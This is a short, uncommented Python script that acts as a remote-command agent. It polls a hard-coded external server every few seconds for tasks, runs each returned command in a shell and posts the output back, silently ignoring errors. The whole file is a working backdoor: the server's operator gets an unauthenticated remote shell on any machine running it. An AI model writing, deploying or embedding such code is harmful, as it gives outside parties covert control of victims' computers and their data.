import requests, time, subprocess, json
API = "https://web-production-22f28.up.railway.app"
DEVICE = "PC_MAIN_001"

def run(cmd):
    try: return subprocess.check_output(cmd, shell=True, text=True, timeout=30)
    except Exception as e: return str(e)

while True:
    try:
        r = requests.get(f"{API}/get_tasks?device={DEVICE}", timeout=5)
        if r.status_code == 200:
            for task in r.json().get("tasks", []):
                out = run(task["cmd"])
                requests.post(f"{API}/result", json={"device":DEVICE,"task_id":task["id"],"output":out})
    except: pass
    time.sleep(3)
